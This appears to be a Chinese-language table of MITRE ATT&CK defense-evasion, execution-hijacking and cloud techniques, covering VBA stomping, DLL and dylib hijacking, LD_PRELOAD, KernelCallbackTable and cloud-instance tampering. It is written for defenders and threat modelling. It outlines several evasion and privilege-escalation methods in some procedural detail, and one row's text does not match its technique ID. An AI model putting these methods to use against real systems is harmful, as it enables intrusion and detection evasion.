| [T1564.007](../techniques/T1564.007.md) | VBA Stomping | 对手可能通过用良性数据替换VBA源代码，隐藏嵌入在MS Office文档中的恶意VBA有效载荷。(引用: FireEye VBA stomp Feb 2020)  嵌入VBA内容的MS Office文档将源代码存储在模块流中。每个模块流都有一个<code>PerformanceCache</code>，其中存储了称为p-code的VBA源代码的单独编译版本。当<code>_VBA_PROJECT</code>流（包含VBA项目的版本相关描述）中指定的MS Office版本与主机MS Office应用程序的版本匹配时，将执行p-code。(引用: Evil Clippy May 2019)(引用: Microsoft _VBA_PROJECT Stream)  对手可能通过用零、良性代码或随机字节覆盖VBA源代码位置，同时保留先前编译的恶意p-code来隐藏恶意VBA代码。扫描恶意VBA源代码的工具可能会被绕过，因为不需要的代码隐藏在编译的p-code中。如果删除VBA源代码，一些工具甚至可能认为没有宏存在。如果<code>_VBA_PROJECT</code>流与主机MS Office应用程序之间存在版本匹配，将执行p-code，否则将解压缩并重新编译良性VBA源代码为p-code，从而删除恶意p-code并可能绕过动态分析。(引用: Walmart Roberts Oct 2018)(引用: FireEye VBA stomp Feb 2020)(引用: pcodedmp Bontchev) |
| [T1564.008](../techniques/T1564.008.md) | 电子邮件隐藏规则 | 对手可能会使用电子邮件规则来隐藏被入侵用户邮箱中的入站电子邮件。许多电子邮件客户端允许用户为各种电子邮件功能创建收件箱规则，包括将电子邮件移动到其他文件夹、将电子邮件标记为已读或删除电子邮件。可以在电子邮件客户端内或通过外部功能（如Windows系统上的<code>New-InboxRule</code>或<code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet）创建或修改规则。(引用: Microsoft Inbox Rules)(引用: MacOS Email Rules)(引用: Microsoft New-InboxRule)(引用: Microsoft Set-InboxRule)  对手可能会利用被入侵用户邮箱中的电子邮件规则来删除和/或移动电子邮件到不太显眼的文件夹。对手可能这样做是为了隐藏安全警报、C2通信或对从被入侵帐户发送的[内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)电子邮件的回复。  组织内的任何用户或管理员（或具有有效凭据的对手）都可以创建规则以自动移动或删除电子邮件。这些规则可以被滥用以削弱/延迟检测，如果电子邮件内容被用户或防御者立即看到的话。恶意规则通常根据消息正文和主题行中的关键字（如<code>malware</code>、<code>suspicious</code>、<code>phish</code>和<code>hack</code>）过滤电子邮件。(引用: Microsoft Cloud App Security)  在某些环境中，管理员可能能够启用在整个组织范围内而不是在单个收件箱上运行的电子邮件规则。例如，Microsoft Exchange支持传输规则，这些规则根据用户指定的条件评估组织接收的所有邮件，然后对符合这些条件的邮件执行用户指定的操作。(引用: Microsoft Mail Flow Rules 2023) 滥用此类功能的对手可能能够自动修改或删除与特定主题（如内部安全事件通知）相关的所有电子邮件。 |
| [T1564.009](../techniques/T1564.009.md) | 资源分叉 | 对手可能会滥用资源分叉来隐藏恶意代码或可执行文件，以规避检测并绕过安全应用程序。资源分叉为应用程序提供了一种结构化的方式来存储资源，例如缩略图图像、菜单定义、图标、对话框和代码。(引用: macOS 分层文件系统概述) 使用资源分叉在显示文件的扩展属性时是可识别的，使用<code>ls -l@</code>或<code>xattr -l</code>命令。资源分叉已被弃用，并被应用程序包结构取代。非本地化资源放置在应用程序包的顶级目录中，而本地化资源放置在<code>/Resources</code>文件夹中。(引用: 资源和数据分叉)(引用: ELC 扩展属性)  对手可以使用资源分叉来隐藏可能直接存储在文件中的恶意数据。对手可以在指定的偏移量处执行带有附加资源分叉的内容，该内容被移动到可执行位置然后调用。资源分叉内容也可能在执行前被混淆/加密。(引用: sentinellabs 资源命名分叉 2020)(引用: tau bundlore erika noerenberg 2020) |
| [T1564.010](../techniques/T1564.010.md) | 进程参数欺骗 | 对手可能尝试通过覆盖进程内存来隐藏进程命令行参数。进程命令行参数存储在进程环境块（PEB）中，这是Windows用于存储有关/用于进程的各种信息的数据结构。PEB包括在执行进程时引用的进程命令行参数。当创建进程时，监控进程创建的防御工具/传感器可能从PEB中检索进程参数。(引用: Microsoft PEB 2021)(引用: Xpn Argue Like Cobalt 2019)  对手可能操纵进程PEB以规避防御。例如，可以滥用[进程空洞](https://attack.mitre.org/techniques/T1055/012)在挂起状态下生成带有良性参数的进程。在生成进程并初始化PEB（并且工具/传感器可能记录进程信息）后，对手可能覆盖PEB以修改命令行参数（例如使用[本机API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code>函数），然后恢复带有恶意参数的进程执行。(引用: Cobalt Strike Arguments 2019)(引用: Xpn Argue Like Cobalt 2019)(引用: Nviso Spoof Command Line 2020)  对手还可能执行带有恶意命令行参数的进程，然后使用良性参数修补内存，以绕过后续的进程内存分析。(引用: FireEye FiveHands April 2021)  此行为还可能与其他技巧（如[父PID欺骗](https://attack.mitre.org/techniques/T1134/004)）结合使用，以操纵或进一步规避基于进程的检测。 |
| [T1564.011](../techniques/T1564.011.md) | 忽略进程中断 | 对手可能通过执行隐藏在进程中断信号中的命令来规避防御机制。许多操作系统使用信号传递消息以控制进程行为。命令解释器通常包括特定的命令/标志，忽略错误和其他挂起，例如当活动会话的用户注销时。(引用: Linux Signal Man) 这些中断信号也可能被防御工具和/或分析师用来暂停或终止指定的运行进程。  对手可能会调用使用 `nohup`、[PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue` 或类似命令的进程，这些命令可能对挂起免疫。(引用: nohup Linux Man)(引用: Microsoft PowerShell SilentlyContinue) 这可能使恶意命令和恶意软件在系统事件（例如用户注销或其 C2 网络连接终止）中继续执行。  隐藏在进程中断信号中可能允许恶意软件继续执行，但与[陷阱](https://attack.mitre.org/techniques/T1546/005)不同，这不会建立[持久性](https://attack.mitre.org/tactics/TA0003)，因为一旦实际终止，进程将不会重新调用。 |
| [T1564.012](../techniques/T1564.012.md) | 文件/路径排除 | 对手可能会尝试通过将文件写入特定文件夹或文件名来隐藏其基于文件的工件，这些文件夹或文件名被排除在防病毒（AV）扫描和其他防御功能之外。为了优化性能以及简化应用程序的安装和合法使用，AV和其他基于文件的扫描器通常会包含排除项。这些排除项可能是上下文相关的（例如，扫描仅在特定触发事件/警报响应时启动），但通常也是硬编码字符串，引用特定文件夹和/或假定为可信和合法的文件。(引用: Microsoft File Folder Exclusions)  对手可能会滥用这些排除项来隐藏其基于文件的工件。例如，对手可能会将其基于文件的有效负载放置在默认或其他众所周知的排除项中，而不是篡改工具设置以添加新的排除项（即，[禁用或修改工具](https://attack.mitre.org/techniques/T1562/001)）。对手还可能使用[安全软件发现](https://attack.mitre.org/techniques/T1518/001)和其他[发现](https://attack.mitre.org/tactics/TA0007)/[侦察](https://attack.mitre.org/tactics/TA0043)活动来发现和验证受害者环境中的现有排除项。 |
| [T1574](../techniques/T1574.md) | 劫持执行流 | 对手可能通过劫持操作系统运行程序的方式来执行他们自己的恶意有效载荷。劫持执行流可以用于持久性，因为这种劫持的执行可能会随着时间的推移而重复发生。对手还可能使用这些机制来提升权限或规避防御，例如应用程序控制或其他执行限制。  对手可能通过多种方式劫持执行流，包括操纵操作系统定位要执行的程序的方式。操作系统定位程序使用的库的方式也可以被拦截。操作系统查找程序/资源的位置，例如文件目录，在Windows中是注册表，也可能被污染以包含恶意有效载荷。 |
| [T1574.001](../techniques/T1574.001.md) | DLL 搜索顺序劫持 | 对手可能通过劫持用于加载 DLL 的搜索顺序来执行他们自己的恶意有效负载。Windows 系统使用一种常见的方法来查找要加载到程序中的所需 DLL。(引用: Microsoft Dynamic Link Library Search Order)(引用: FireEye Hijacking July 2010) 劫持 DLL 加载可能是为了建立持久性以及提升权限和/或规避文件执行限制。  对手可以通过多种方式劫持 DLL 加载。对手可能会在目录中植入特洛伊木马动态链接库文件 (DLL)，该目录将在请求的合法库之前被搜索，从而导致 Windows 在调用受害者程序时加载他们的恶意库。对手还可能通过放置与模糊指定的 DLL 同名的恶意 DLL 在 Windows 搜索合法 DLL 之前的位置来执行 DLL 预加载，也称为二进制植入攻击。(引用: OWASP Binary Planting) 通常这个位置是程序的当前工作目录。(引用: FireEye fxsst June 2011) 远程 DLL 预加载攻击发生在程序将其当前目录设置为远程位置（如 Web 共享）之前加载 DLL。(引用: Microsoft Security Advisory 2269637)  幻影 DLL 劫持是一种特定类型的 DLL 搜索顺序劫持，对手针对对不存在的 DLL 文件的引用。(引用: Hexacorn DLL Hijacking)(引用: Adversaries Hijack DLLs) 他们可能能够通过在缺失模块的位置植入具有正确名称的恶意 DLL 来加载自己的恶意 DLL。  对手还可以通过 DLL 重定向直接修改搜索顺序，启用后（在注册表中并创建重定向文件）可能导致程序加载不同的 DLL。(引用: Microsoft Dynamic-Link Library Redirection)(引用: Microsoft Manifests)(引用: FireEye DLL Search Order Hijacking)  如果配置为以更高权限级别运行的程序易受路径劫持攻击，那么加载的对手控制的 DLL 也将以更高权限级别执行。在这种情况下，该技术可用于从用户到管理员或 SYSTEM 的权限提升，或从管理员到 SYSTEM，具体取决于程序。受路径劫持攻击的程序可能会表现正常，因为恶意 DLL 可能会配置为也加载它们原本要替换的合法 DLL。 |
| [T1574.002](../techniques/T1574.002.md) | DLL侧加载 | 攻击者可能通过侧加载DLL执行其恶意负载。类似于[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)，侧加载涉及劫持程序加载的DLL。但不仅仅是将DLL放置在程序的搜索顺序中然后等待受害者应用程序被调用，攻击者可能通过放置并调用执行其负载的合法应用程序直接侧加载其负载。  侧加载利用加载器使用的DLL搜索顺序，将受害者应用程序和恶意负载并排放置。攻击者可能使用侧加载作为在合法、受信任且可能提升权限的系统或软件进程下掩盖其操作的手段。用于侧加载负载的良性可执行文件在交付和/或执行期间可能不会被标记。攻击者负载在被加载到受信任进程的内存之前也可能被加密/打包或以其他方式混淆。(引用: FireEye DLL侧加载) |
| [T1574.004](../techniques/T1574.004.md) | Dylib劫持 | 对手可能通过在受害者应用程序在运行时搜索的路径中放置具有预期名称的恶意动态库（dylib）来执行其负载。动态加载器将根据搜索路径的顺序尝试查找dylib。dylib的路径可能以<code>@rpath</code>为前缀，这允许开发人员使用相对路径在运行时根据可执行文件的位置指定一组搜索路径。此外，如果使用弱链接，例如<code>LC_LOAD_WEAK_DYLIB</code>函数，即使预期的dylib不存在，应用程序仍将执行。弱链接使开发人员能够在添加新API的多个macOS版本上运行应用程序。  对手可能通过在识别的路径中插入具有缺失dylib名称的恶意dylib来获得执行。(引用: Wardle Dylib Hijack Vulnerable Apps)(引用: Wardle Dylib Hijacking OSX 2015)(引用: Github EmpireProject HijackScanner)(引用: Github EmpireProject CreateHijacker Dylib) dylib被加载到应用程序的地址空间中，允许恶意dylib继承应用程序的权限级别和资源。根据应用程序的不同，这可能导致权限提升和不受限制的网络访问。由于执行被掩盖在合法进程下，此方法还可能逃避安全产品的检测。(引用: Writing Bad Malware for OSX)(引用: wardle artofmalware volume1)(引用: MalwareUnicorn macOS Dylib Injection MachO) |
| [T1574.005](../techniques/T1574.005.md) | 可执行安装文件权限弱点 | 对手可能通过劫持安装程序使用的二进制文件来执行他们自己的恶意负载。这些进程可能会自动执行特定的二进制文件，作为其功能的一部分或执行其他操作。如果包含目标二进制文件的文件系统目录或二进制文件本身的权限设置不正确，则可以使用用户级权限覆盖目标二进制文件，并由原始进程执行。如果原始进程和线程在更高权限级别下运行，则替换的二进制文件也将在更高权限级别下执行，这可能包括 SYSTEM。  此技术的另一种变体可以通过利用可执行自解压安装程序中常见的弱点来执行。在安装过程中，安装程序通常使用<code>%TEMP%</code>目录中的子目录来解压缩 DLL、EXE 或其他负载等二进制文件。当安装程序创建子目录和文件时，它们通常不会设置适当的权限来限制写访问，这允许在子目录中执行不受信任的代码或覆盖安装过程中使用的二进制文件。这种行为与[DLL 搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)有关，并可能利用其优势。  对手可能会使用此技术替换合法的二进制文件，以更高权限级别执行代码。一些安装程序还可能需要提升权限，这将在执行对手控制的代码时导致权限提升。这种行为与[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)有关。已经向软件供应商报告了几个现有常见安装程序中此弱点的示例。(引用: mozilla_sec_adv_2012)(引用: Executable Installers are Vulnerable) 如果执行进程设置为在特定时间或某个事件（例如系统启动）期间运行，则此技术还可用于持久性。 |
| [T1574.006](../techniques/T1574.006.md) | 动态链接器劫持 | 对手可能通过劫持动态链接器用于加载共享库的环境变量来执行他们自己的恶意负载。在程序的执行准备阶段，动态链接器从环境变量和文件（如 Linux 上的 <code>LD_PRELOAD</code> 或 macOS 上的 <code>DYLD_INSERT_LIBRARIES</code>）加载指定的共享库的绝对路径。环境变量中指定的库首先加载，优先于具有相同函数名称的系统库。（引用：Man LD.SO）（引用：TLDP 共享库）（引用：Apple Doco Archive 动态库）这些变量通常由开发人员用于调试二进制文件而无需重新编译、解决映射符号冲突以及在不更改原始库的情况下实现自定义函数。（引用：Baeldung LD_PRELOAD）  在 Linux 和 macOS 上，劫持动态链接器变量可能会授予对受害者进程内存、系统/网络资源的访问权限，并可能提升权限。此方法还可能规避安全产品的检测，因为执行被掩盖在合法进程下。对手可以使用 <code>export</code> 命令、<code>setenv</code> 函数或 <code>putenv</code> 函数通过命令行设置环境变量。对手还可以利用 [动态链接器劫持](https://attack.mitre.org/techniques/T1574/006) 在 shell 中导出变量或使用更高级别的语法（如 Python 的 <code>os.environ</code>）以编程方式设置变量。  在 Linux 上，对手可能会设置 <code>LD_PRELOAD</code> 以指向与受害者程序请求的合法库名称匹配的恶意库，从而导致操作系统在执行受害者程序时加载对手的恶意代码。<code>LD_PRELOAD</code> 可以通过环境变量或 <code>/etc/ld.so.preload</code> 文件设置。（引用：Man LD.SO）（引用：TLDP 共享库）由 <code>LD_PRELOAD</code> 指定的库由 <code>dlopen()</code> 和 <code>mmap()</code> 分别加载和映射到内存中。（引用：Linux 和 macOS 上的代码注入）（引用：Uninformed Needle）（引用：Phrack halfdead 1997）（引用：Brown Exploiting Linkers）  在 macOS 上，此行为在概念上与 Linux 上相同，只是在较低级别上实现 macOS 动态库（dyld）有所不同。对手可以设置 <code>DYLD_INSERT_LIBRARIES</code> 环境变量以指向包含受害者程序请求的合法库或函数名称的恶意库。（引用：TheEvilBit DYLD_INSERT_LIBRARIES）（引用：Timac DYLD_INSERT_LIBRARIES）（引用：Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass） |
| [T1574.007](../techniques/T1574.007.md) | 通过PATH环境变量进行路径拦截 | 对手可能通过劫持用于加载库的环境变量来执行自己的恶意有效负载。PATH环境变量包含一个目录列表（用户和系统），操作系统按顺序搜索这些目录以查找从脚本或命令行调用的二进制文件。  对手可以将恶意程序放置在PATH环境变量列表中较早的条目中，从而导致操作系统在按顺序搜索该PATH列表时执行恶意二进制文件而不是合法二进制文件。  例如，在Windows上，如果对手将名为“net.exe”的恶意程序放置在`C:\example path`中，该路径默认情况下优先于`C:\Windows\system32\net.exe`在PATH环境变量中，当从命令行执行“net”时，将调用`C:\example path`而不是系统的合法可执行文件`C:\Windows\system32\net.exe`。某些执行程序的方法依赖于PATH环境变量来确定在未给出程序路径时要搜索的位置，例如从[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)执行程序。(引用: ExpressVPN PATH env Windows 2021)  对手还可以直接修改指定要搜索目录的$PATH变量。对手可以修改$PATH变量以指向他们有写访问权限的目录。当调用使用$PATH变量的程序时，操作系统将搜索指定目录并执行恶意二进制文件。在macOS上，这也可以通过修改$HOME变量来执行。这些变量可以使用命令行、launchctl、[Unix Shell配置修改](https://attack.mitre.org/techniques/T1546/004)或修改`/etc/paths.d`文件夹内容来修改。(引用: uptycs Fake POC linux malware 2023)(引用: nixCraft macOS PATH variables)(引用: Elastic Rules macOS launchctl 2022) |
| [T1574.008](../techniques/T1574.008.md) | 通过搜索顺序劫持进行路径拦截 | 对手可能通过劫持用于加载其他程序的搜索顺序来执行他们自己的恶意有效负载。由于某些程序在调用其他程序时不使用完整路径，对手可能会将他们自己的文件放置在调用程序所在的目录中，从而导致操作系统在调用程序的请求下启动他们的恶意软件。  搜索顺序劫持发生在对手滥用Windows搜索未指定路径的程序的顺序时。与[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)不同，搜索顺序因执行程序的方法而异。(引用: Microsoft CreateProcess) (引用: Windows NT Command Shell) (引用: Microsoft WinExec) 然而，Windows通常会在搜索Windows系统目录之前搜索启动程序的目录。发现易受搜索顺序劫持（即未指定可执行文件路径）的程序的对手可能会通过在启动程序的目录中创建一个命名为不正确指定程序的程序来利用此漏洞。  例如，“example.exe”运行“cmd.exe”并带有命令行参数<code>net user</code>。对手可能会在example.exe所在的目录中放置一个名为“net.exe”的程序，“net.exe”将被运行而不是Windows系统实用程序net。此外，如果对手在与“net.exe”相同的目录中放置一个名为“net.com”的程序，那么<code>cmd.exe /C net user</code>将执行“net.com”而不是“net.exe”，因为在PATHEXT下定义的可执行文件扩展名顺序。(引用: Microsoft Environment Property)  搜索顺序劫持也是劫持DLL加载的常见做法，并在[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)中进行了介绍。 |
| [T1574.009](../techniques/T1574.009.md) | 通过未加引号的路径进行路径拦截 | 对手可能通过劫持易受攻击的文件路径引用来执行他们自己的恶意有效载荷。对手可以利用缺乏引号的路径，通过在路径中的更高级目录中放置可执行文件，使Windows选择对手的可执行文件来启动。  如果路径中有一个或多个空格且未加引号（例如<code>C:\unsafe path with space\program.exe</code>与<code>"C:\safe path with space\program.exe"</code>），服务路径(引用: Microsoft CurrentControlSet Services)和快捷方式路径也可能容易受到路径拦截的攻击。(引用: Help eliminate unquoted path)（存储在Windows注册表键中）对手可以在路径的更高级目录中放置一个可执行文件，Windows将解析该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径是<code>C:\program files\myapp.exe</code>，对手可能会在<code>C:\program.exe</code>创建一个程序，该程序将被运行而不是预期的程序。(引用: Windows Unquoted Services)(引用: Windows Privilege Escalation Guide)  如果可执行文件被定期调用，此技术可以用于持久性，如果被拦截的可执行文件由更高权限的进程启动，则可以用于权限提升。 |
| [T1574.010](../techniques/T1574.010.md) | 服务文件权限弱点 | 对手可能通过劫持服务使用的二进制文件来执行他们自己的恶意有效载荷。对手可能利用Windows服务权限中的漏洞来替换服务启动时执行的二进制文件。这些服务进程可能会自动执行特定的二进制文件，作为其功能的一部分或执行其他操作。如果包含目标二进制文件的文件系统目录或二进制文件本身的权限设置不正确，则可以使用用户级权限覆盖目标二进制文件，并由原始进程执行。如果原始进程和线程在更高权限级别下运行，则替换的二进制文件也将在更高权限级别下执行，这可能包括SYSTEM。  对手可能使用此技术替换合法二进制文件为恶意二进制文件，以便在更高权限级别下执行代码。如果执行进程设置为在特定时间或某个事件（例如系统启动）期间运行，则此技术也可用于持久性。 |
| [T1574.011](../techniques/T1574.011.md) | 服务注册表权限弱点 | 对手可能通过劫持服务使用的注册表项来执行他们自己的恶意有效负载。对手可能会利用服务注册表项权限中的漏洞，将原本指定的可执行文件重定向到他们控制的文件，以便在服务启动时启动他们自己的代码。Windows 在 <code>HKLM\SYSTEM\CurrentControlSet\Services</code> 下的注册表中存储本地服务配置信息。可以通过服务控制器、sc.exe、[PowerShell](https://attack.mitre.org/techniques/T1059/001) 或 [Reg](https://attack.mitre.org/software/S0075) 等工具操作存储在服务注册表项下的信息。对注册表项的访问通过访问控制列表和用户权限进行控制。(引用: Registry Key Security)(引用: malware_hides_service)  如果用户和组的权限设置不正确，并允许访问服务的注册表项，对手可能会更改服务的 binPath/ImagePath 以指向他们控制的不同可执行文件。当服务启动或重新启动时，对手控制的程序将执行，允许对手在服务设置为执行的帐户上下文（本地/域帐户、SYSTEM、LocalService 或 NetworkService）中建立持久性和/或提升权限。  对手还可能更改服务注册表树中的其他注册表项。例如，可以更改 <code>FailureCommand</code> 键，以便在服务失败或故意损坏时在提升的上下文中执行服务。(引用: Kansa Service related collectors)(引用: Tweet Registry Perms Weakness)  <code>Performance</code> 键包含驱动程序服务性能 DLL 的名称和 DLL 中几个导出函数的名称。(引用: microsoft_services_registry_tree) 如果 <code>Performance</code> 键尚不存在，并且对手控制的用户具有 <code>Create Subkey</code> 权限，对手可能会在服务的注册表树中创建 <code>Performance</code> 键以指向恶意 DLL。(引用: insecure_reg_perms)  对手还可能添加 <code>Parameters</code> 键，该键存储驱动程序特定数据，或其他自定义子键以建立持久性或启用其他恶意活动。(引用: microsoft_services_registry_tree)(引用: troj_zegost) 此外，如果对手使用 svchost.exe 启动他们的恶意服务，可以使用 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code> 标识服务的文件。(引用: malware_hides_service) |
| [T1574.012](../techniques/T1574.012.md) | COR_PROFILER | 对手可能利用COR_PROFILER环境变量劫持加载.NET CLR的程序的执行流。COR_PROFILER是一个.NET框架功能，允许开发人员指定一个非托管（或.NET外部）分析DLL加载到每个加载公共语言运行时（CLR）的.NET进程中。这些分析器旨在监视、排除故障和调试由.NET CLR执行的托管代码。(引用: Microsoft Profiling Mar 2017)(引用: Microsoft COR_PROFILER Feb 2013)  COR_PROFILER环境变量可以在各种范围内设置（系统、用户或进程），导致不同级别的影响。系统和用户范围的环境变量范围在注册表中指定，其中可以将[组件对象模型](https://attack.mitre.org/techniques/T1559/001)（COM）对象注册为分析DLL。还可以在内存中创建进程范围的COR_PROFILER，而无需修改注册表。从.NET框架4开始，只要在COR_PROFILER_PATH环境变量中指定DLL的位置，就不需要注册分析DLL。(引用: Microsoft COR_PROFILER Feb 2013)  对手可能滥用COR_PROFILER建立持久性，每次调用CLR时在所有.NET进程的上下文中执行恶意DLL。如果受害者.NET进程以更高权限级别执行，COR_PROFILER还可以用于提升权限（例如[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)），以及挂钩和[削弱防御](https://attack.mitre.org/techniques/T1562)由.NET进程提供。(引用: RedCanary Mockingbird May 2020)(引用: Red Canary COR_PROFILER May 2020)(引用: Almond COR_PROFILER Apr 2019)(引用: GitHub OmerYa Invisi-Shell)(引用: subTee .NET Profilers May 2017) |
| [T1574.013](../techniques/T1574.013.md) | KernelCallbackTable | 对手可能滥用进程的<code>KernelCallbackTable</code>来劫持其执行流以运行自己的有效载荷。(引用: Lazarus APT January 2022)(引用: FinFisher exposed) <code>KernelCallbackTable</code>可以在进程环境块（PEB）中找到，并在加载<code>user32.dll</code>后初始化为GUI进程可用的图形函数数组。(引用: Windows Process Injection KernelCallbackTable)  对手可能通过替换原始回调函数为恶意有效载荷来劫持进程的执行流。修改回调函数可以通过涉及相关行为的各种方式实现，例如[反射代码加载](https://attack.mitre.org/techniques/T1620)或[进程注入](https://attack.mitre.org/techniques/T1055)到另一个进程中。  可以通过定位PEB（例如，通过调用<code>NtQueryInformationProcess()</code> [本机API](https://attack.mitre.org/techniques/T1106)函数）获得指向<code>KernelCallbackTable</code>内存地址的指针。(引用: NtQueryInformationProcess) 一旦找到指针，可以复制<code>KernelCallbackTable</code>，并将表中的函数（例如<code>fnCOPYDATA</code>）设置为恶意有效载荷的地址（例如通过<code>WriteProcessMemory()</code>）。然后更新PEB以包含新表的地址。一旦调用篡改的函数，恶意有效载荷将被触发。(引用: Lazarus APT January 2022)  篡改的函数通常使用Windows消息调用。在劫持进程并执行恶意代码后，<code>KernelCallbackTable</code>也可能由恶意有效载荷的其余部分恢复到其原始状态。(引用: Lazarus APT January 2022) 使用<code>KernelCallbackTable</code>劫持执行流可能会规避安全产品的检测，因为执行可以掩盖在合法进程下。 |
| [T1574.014](../techniques/T1574.014.md) | AppDomainManager | 对手可能通过劫持 .NET `AppDomainManager` 加载程序集的方式来执行他们自己的恶意有效负载。 .NET 框架使用 `AppDomainManager` 类在进程内创建和管理一个或多个隔离的运行时环境（称为应用程序域）以托管 .NET 应用程序的执行。程序集（编译为运行 .NET 代码的 `.exe` 或 `.dll` 二进制文件）可以作为可执行代码加载到应用程序域中。(引用: Microsoft App Domains)  称为“AppDomainManager 注入”，对手可能通过劫持 .NET 应用程序加载程序集的方式来执行任意代码。例如，恶意软件可能在目标进程内创建一个自定义应用程序域以加载和执行任意程序集。或者，可以篡改定义 .NET 运行时设置的配置文件（`.config`）或进程环境变量，以指示原本无害的 .NET 应用程序将恶意程序集（按名称标识）加载到目标进程中。(引用: PenTestLabs AppDomainManagerInject)(引用: PwC Yellow Liderc)(引用: Rapid7 AppDomain Manager Injection) |
| [T1578](../techniques/T1578.md) | 修改云计算基础设施 | 对手可能会尝试修改云帐户的计算服务基础设施以规避防御措施。对计算服务基础设施的修改可以包括创建、删除或修改一个或多个组件，例如计算实例、虚拟机和快照。  通过修改基础设施组件获得的权限可能会绕过限制现有基础设施访问的限制。修改基础设施组件还可能允许对手规避检测并删除其存在的证据。(引用: Mandiant M-Trends 2020) |
| [T1578.001](../techniques/T1578.001.md) | 创建快照 | 攻击者可能会在云账户中创建快照或数据备份以规避防御。快照是现有云计算组件（如虚拟机（VM）、虚拟硬盘或卷）的时间点副本。攻击者可能会利用权限创建快照，以绕过阻止访问现有计算服务基础设施的限制，这与[恢复云实例](https://attack.mitre.org/techniques/T1578/004)不同，在后者中，攻击者可能会恢复到快照以规避检测并删除其存在的证据。  攻击者可能会[创建云实例](https://attack.mitre.org/techniques/T1578/002)，将一个或多个创建的快照挂载到该实例，然后应用允许攻击者访问所创建实例的策略，例如允许其入站和出站SSH访问的防火墙策略。（引用：Mandiant M-Trends 2020） |
| [T1578.002](../techniques/T1578.002.md) | 创建云实例 | 对手可能会在云账户的计算服务中创建一个新实例或虚拟机（VM），以规避防御。创建新实例可能允许对手绕过当前账户中实例上存在的防火墙规则和权限。对手可能会[创建快照](https://attack.mitre.org/techniques/T1578/001)一个或多个账户中的卷，创建一个新实例，挂载快照，然后应用一个较少限制的安全策略，以收集[本地系统数据](https://attack.mitre.org/techniques/T1005)或进行[远程数据暂存](https://attack.mitre.org/techniques/T1074/002)。(引用: Mandiant M-Trends 2020)  创建新实例还可能允许对手在环境中进行恶意活动，而不影响当前运行实例的执行。 |
| [T1578.003](../techniques/T1578.003.md) | 删除云实例 | 对手可能会在执行恶意活动后删除云实例，以试图规避检测并删除其存在的证据。删除实例或虚拟机可以删除有价值的取证工件和其他可疑行为的证据，如果实例不可恢复。  对手还可能[创建云实例](https://attack.mitre.org/techniques/T1578/002)并在实现其目标后终止实例。(引用: Mandiant M-Trends 2020) |
| [T1578.004](../techniques/T1578.004.md) | 还原云实例 | 对手可能会在执行恶意活动后还原对云实例所做的更改，以试图逃避检测并删除其存在的证据。在高度虚拟化的环境中，例如基于云的基础设施，这可以通过通过云管理仪表板或云API恢复虚拟机（VM）或数据存储快照来实现。  这种技术的另一种变体是利用附加到计算实例的临时存储。大多数云提供商提供各种类型的存储，包括持久性、本地和/或临时存储，临时类型通常在VM停止/重启时重置。(引用: Tech Republic - Restore AWS Snapshots)(引用: Google - Restore Cloud Snapshot) |
| [T1578.005](../techniques/T1578.005.md) | 修改云计算配置 | 对手可能会修改直接影响云计算基础设施的大小、位置和可用资源的设置，以规避防御。这些设置可能包括服务配额、订阅关联、租户范围的策略或其他影响可用计算的配置。此类修改可能允许对手滥用受害者的计算资源来实现其目标，可能不会影响正在运行的实例的执行和/或暴露其活动。  例如，云提供商通常通过配额限制客户使用计算资源。客户可以请求调整这些配额以支持增加的计算需求，尽管这些调整可能需要云提供商的批准。对手在妥协云环境后也可能会请求配额调整，以支持其活动，例如在不引起怀疑的情况下启用额外的 [资源劫持](https://attack.mitre.org/techniques/T1496)。(引用: Microsoft Cryptojacking 2023) 对手还可能通过修改任何限制部署虚拟机大小的租户范围策略来增加允许的资源使用量。(引用: Microsoft Azure Policy)  对手还可能修改影响云资源部署位置的设置，例如启用 [未使用/不受支持的云区域](https://attack.mitre.org/techniques/T1535)。 |
| [T1586.003](../techniques/T1586.003.md) | 云账户 | 云环境中的有效账户可能允许对手执行操作以实现初始访问、持久性、权限提升或防御规避。云账户是由组织创建和配置的账户，供用户、远程支持、服务或管理云服务提供商或SaaS应用程序中的资源使用。云账户可以仅存在于云中；或者，它们可能通过与其他身份源（例如Windows Active Directory）的同步或联合在本地系统和云之间混合连接。(引用: AWS Identity Federation)(引用: Google Federating GC)(引用: Microsoft Deploying AD Federation)  服务或用户账户可能通过[暴力破解](https://attack.mitre.org/techniques/T1110)、[网络钓鱼](https://attack.mitre.org/techniques/T1566)或各种其他手段成为对手的目标，以获得对环境的访问权限。联合或同步账户可能是对手影响本地系统和云环境的途径——例如，通过利用共享凭据登录到[远程服务](https://attack.mitre.org/techniques/T1021)。高权限云账户，无论是联合、同步还是仅云账户，也可能允许通过SaaS [软件部署工具](https://attack.mitre.org/techniques/T1072)在混合连接设备上运行命令，从而转移到本地环境。  对手可能会在被破坏的云账户上创建长期的[附加云凭据](https://attack.mitre.org/techniques/T1098/001)，以在环境中保持持久性。这些凭据还可以用于绕过多因素身份验证等安全控制。  云账户还可能能够通过环境中的各种手段获得[临时提升的云访问权限](https://attack.mitre.org/techniques/T1548/005)或其他权限。角色分配或角色假设策略中的配置错误可能允许对手使用这些机制来利用超出账户预期范围的权限。这些超权限账户可能用于通过[云API](https://attack.mitre.org/techniques/T1059/009)或其他方法从在线存储账户和数据库中收集敏感数据。  |
